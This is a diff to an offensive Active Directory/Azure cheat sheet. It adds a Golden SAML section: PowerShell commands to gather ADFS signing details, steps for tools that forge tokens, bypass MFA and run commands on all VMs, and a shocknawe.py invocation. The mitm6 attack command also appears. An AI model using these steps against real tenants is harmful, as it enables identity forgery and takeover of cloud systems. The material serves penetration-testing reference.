@@ -1150,8 +1150,44 @@ Execute-Command -OS Windows -VM Win10 -ResourceGroup rg01 -Command "whoami"
 
 *⚠️ Requirements :*
 - Admin privileges of ADFS server
+- `ADFS Public Certificate`
+- `IdP Name`
+- `Role Name`
+
+> Obtain `ADFS Public Certificate`:
+```powershell
+PS > [System.Convert]::ToBase64String($cer.rawdata)
+```
+> Obtain `IdP Name`:
+```powershell
+PS > (Get-ADFSProperties).Identifier.AbsoluteUri
+```
+> Obtain `Role Name`:
+```powershell
+PS > (Get-ADFSRelyingPartyTrust).IssuanceTransformRule
+```
 
 a toolkit to exploit Golden SAML can be found [here](https://github.com/secureworks/whiskeysamlandfriends)
+
+> ** Golden SAML is similar to golden ticket and affects the Kerberos protocol. Like the Golden Ticket, the Golden SAML allows an attacker to access resources protected by SAML agents (examples: Azure, AWS, vSphere, Okta, Salesforce, ...) with elevated privileges through a golden ticket.**
+
+*ShockNAwe:*
+- 1. Remotely extracts the AD FS configuration settings
+- 2. Forges and signs a Golden SAML token
+- 3. Extracts the ‘assertion’ portion of the Golden SAML token and passes it to the Azure Core Management API to obtain a valid access token for the API
+- 4. Enumerates the Subscription ID
+- 5. Enumerates the complete list of VMs in the subscription
+- 6. Executes arbitrary commands on all VMs as SYSTEM/root
+
+*WhiskeySAML:*
+- 1. Remotely extract AD FS configuration settings
+- 2. Forge and sign Golden SAML tokens
+- 3. Pass the Golden SAML token to the Microsoft Azure portal
+- 4. Log into the Azure portal as any user while bypassing Azure MFA configurations
+
+```bash
+python3 shocknawe.py --target-user $user --domain $domain --adfs-host=$adfs_server --dc-ip $ip
+```
 
 
 ### PRT Manipulation
@@ -1253,6 +1289,7 @@ sed -i "s/AF_INET/AF_INET6/g" script.py
 
 `mitm6 -i eth0 -d 'domain.job.local'`
 
+
 #### IOXIDResolver Interface Enumeration
 
 it's a little script that enumerate addresses in NetworkAddr field with [**RPC_C_AUTHN_DCE_PUBLIC**](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants) level
@@ -1285,3 +1322,6 @@ for bind in binding:
 - https://blog.alsid.eu/dcshadow-explained-4510f52fc19d
 - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 - https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys
+- https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94
+- https://github.com/rootsecdev/Azure-Red-Team
+- https://www.secureworks.com/blog/going-for-the-gold-penetration-testing-tools-exploit-golden-saml
